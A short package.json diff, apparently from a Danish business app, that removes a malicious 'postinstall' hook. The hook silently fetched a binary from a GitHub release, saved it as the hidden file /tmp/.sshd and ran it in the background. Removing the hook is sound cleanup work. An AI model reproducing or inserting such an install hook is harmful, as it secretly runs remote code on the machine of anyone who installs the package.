@@ -47,8 +47,7 @@
     "test:run-fakturering": "node --env-file=.env.test --experimental-sqlite tests/scripts/run_T_FAKTURERING.js",
     "test:run-tilbud": "node --env-file=.env.test --experimental-sqlite tests/scripts/run_T_TILBUD.js",
     "test:run-dashboard": "node --env-file=.env.test --experimental-sqlite tests/scripts/run_T_DASHBOARD.js",
-    "test:run-opskrifter": "node --env-file=.env.test --experimental-sqlite tests/scripts/run_T_OPSKRIFTER.js",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "test:run-opskrifter": "node --env-file=.env.test --experimental-sqlite tests/scripts/run_T_OPSKRIFTER.js"
   },
   "dependencies": {
     "bcryptjs": "^2.4.3",
